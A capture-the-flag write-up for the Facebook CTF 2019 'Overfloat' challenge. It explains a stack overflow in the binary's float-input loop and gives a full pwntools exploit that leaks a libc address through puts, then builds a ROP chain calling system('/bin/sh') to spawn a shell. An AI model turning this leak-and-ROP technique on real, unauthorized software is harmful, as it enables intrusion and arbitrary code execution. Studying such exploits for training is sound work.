---
title: Facebook CTF 2019 Overfloat
author: megachar0x01
date: 2022-07-11
categories: [Pwn, amd64, Binary Exploitation, nightmare, module08]
---

### Purpose : Get shell on system 

[![asciicast](https://asciinema.org/a/507984.svg)](https://asciinema.org/a/507984)

Let's start by checking restrictions on binary.

<img src="https://i.imgur.com/wQps0v7.png" alt="img_1">

Only Stack is not executable which kills the possibility of putting shellcode in vuln_buffer and jumping to it.

Start reversing by analyzing the main function. We can see that usage of settbuff functions so binary works correctly with network sockets. Then puts print ASCII art. Memset function  is used to clear out an array with zero. Pass pointer of Char array to "chart_course " function. Then msg is printed and the function exits.


<img src="https://i.imgur.com/VS2hi0h.png" alt="img_2">


Now it's time to analyze the chart_course function. Loop is created which can only be exited if the user inputs "done". This loop is overflowing as we will be seeing in a minute. We can ignore some parts of the code as it is printing "LAT" on even and "LON" on odd. fget function is used to take take "100" bytes input from the user and store it in local_78. Next, we see first 4 bytes are taken from the local_78 variable and compared to the "done" string if compare is successful function is exited, and if not rest of the code carries on. As we go down we can see atof function is used to convert a string into float and then save it in dvar2 (This part will be important while building an exploit because it controls what is placed on the stack ). dvar2 value is saved to local_10. memset is used to clear values in dvar2. This part is important because be Attentive address of char_array is incremented on every loop by 4 bytes using the loop counter multiplied by 4 and then local_10 content is saved on that address. This part is which creates buffer overflow as no checks are placed.


<img src="https://i.imgur.com/ScXigbq.png" alt="img_3">


Now it's time to start building an exploit. To bypass aslr and create a rop chain we have to find libc base address. For calculating base address we leak puts address from got and then subtract from the offset of puts to get base_address then transfer execution to the main function. This time exploiting the same vuln we can get shell we have to create a rop chain to call system function while passing "/bin/sh" strings. It's all ez most important and the time-consuming thing was building format function. As I stated earlier atof function converts float value in string form to float data type as all this is handled in flu (special register xmm0,ymm0,zmm0 for floating-point arithmetic ). So when values from special registers are placed on memory are in hex form. To put what hex values should be placed on memory I came up with this idea (it barely does its work there will be  a better way to solve this issue ).



```python
#!/usr/bin/python3 
from pwn import *
import struct

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''

continue
'''.format(**locals())


exe = './overfloat'; elf = context.binary = ELF(exe, checksec=False);exe_rop = ROP(exe,checksec=False)
libc = ELF(" <add full path to libc > ",checksec=False)
ld = ELF(" <add full path to ld > ",checksec=False)

######### hardcode ########

plt_puts = elf.plt['puts'] 
got_puts =  elf.got['puts'] 
pop_rdi = exe_rop.find_gadget(['pop rdi','ret'])[0] 
main = elf.symbols['main'] 
ret = exe_rop.find_gadget(['ret'])[0] 

###########################


def format(recv_value):
    x = bytes(str(struct.unpack("f",(p64(recv_value)[4:8]))).strip("(").strip(",)"),"utf-8")
    y = bytes(str(struct.unpack("f",(p64(recv_value)[0:4]))).strip("(").strip(",)"),"utf-8")
    io.sendlineafter(b"]:",y)
    io.sendlineafter(b"]:",x)

def leak_value():
    for x in range(7):
        format(0x0000000000000000)
    format(pop_rdi)
    format(got_puts)
    format(plt_puts)
    format (main)
    io.sendlineafter(b"]:",b"done")
    io.recvline()
    raw = io.recvline().strip(b"\n")
    leak_add = u64(raw + b"\x00"*(8-len(raw)))
    libc.address = leak_add - libc.symbols['puts']
    print("leak value",hex(libc.address))

def exploit():
    for x in range(7):
        format(0x4242424242424242)
    format(pop_rdi)
    format(next(libc.search(b"/bin/sh")))
    format(ret)
    format(libc.symbols['system'])   
    io.sendlineafter(b"]:",b"done")

io = start()

leak_value()

exploit()

io.interactive()

```

